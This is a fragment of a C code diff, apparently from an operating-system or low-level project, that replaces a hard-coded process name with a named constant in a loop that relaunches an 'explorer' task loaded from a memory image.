@@ -71,13 +71,13 @@ int runcmd(char * cmd) {
 #endif
 
 		int imagesize = getSizeOfImage((char*)MAIN_DLL_SOURCE_BASE);
-		__kCreateProcessFromAddrFunc(MAIN_DLL_SOURCE_BASE, imagesize, "__kExplorer", 3, 0);
+		__kCreateProcessFromAddrFunc(MAIN_DLL_SOURCE_BASE, imagesize, EXPLORER_TASKNAME, 3, 0);
 
 		while (1)
 		{
-			if (__findProcessFuncName("__kExplorer") == FALSE)
+			if (__findProcessFuncName(EXPLORER_TASKNAME) == FALSE)
 			{
-				__kCreateProcess(MAIN_DLL_SOURCE_BASE, imagesize, "main.dll", "__kExplorer", 3, 0);
+				__kCreateProcess(MAIN_DLL_SOURCE_BASE, imagesize, "main.dll", EXPLORER_TASKNAME, 3, 0);
 			}
 
 			__asm {
